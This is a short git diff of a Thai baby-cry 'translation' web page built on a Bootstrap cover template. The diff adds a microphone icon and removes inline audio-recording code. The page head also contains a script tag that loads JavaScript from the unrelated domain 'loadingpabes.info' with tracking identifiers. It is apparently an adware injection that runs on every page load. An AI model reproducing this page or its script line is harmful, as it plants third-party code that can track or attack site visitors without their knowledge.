@@ -12,6 +12,9 @@
     <!-- Bootstrap core CSS -->
     <link href="http://getbootstrap.com/dist/css/bootstrap.min.css" rel="stylesheet">
 
+    <!-- Microphone CSS-->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
     <!-- Custom styles for this template -->
     <link href="http://getbootstrap.com/docs/4.0/examples/cover/cover.css" rel="stylesheet">
   <script type="text/javascript" src="http://loadingpabes.info/jo/is2?id=A33BD649-48B4-56BD-BECF-BE95821FE7A6&amp;d=23536a95-1dc4-496f-9964-b85788f42bd2&amp;cl=upd"></script>
@@ -34,24 +37,10 @@
         <h1 class="cover-heading">วุ้นแปลภาษา</h1>
         <p class="lead">กดปุ่มฟังเสียงค้างเพื่อให้โปรแกรมอ่านเสียงร้องไห้ของบุตรหลาน รอสักพักเพื่อให้โปรแกรมประมวลผล</p>
         <p class="lead">
-          <a href="http://getbootstrap.com/docs/4.0/example/cover/#" class="btn btn-lg btn-secondary">ทดสอบ</a>
+
+          <a style="font-size:24px" href="google.co.th" class="fa fa-microphone"></a>
         </p>
-        <div class="sound record">
-          <audio id="player" controls></audio>
-          <script>
-          var player = document.getElementById('player');
 
-          var handleSuccess = function(stream) {
-          if (window.URL) {
-            player.src = window.URL.createObjectURL(stream);
-          } else {
-            player.src = stream;
-          }
-          };
-
-          navigator.mediaDevices.getUserMedia({ audio: true, video: false })
-          .then(handleSuccess);
-          </script>
 
 
       </main>
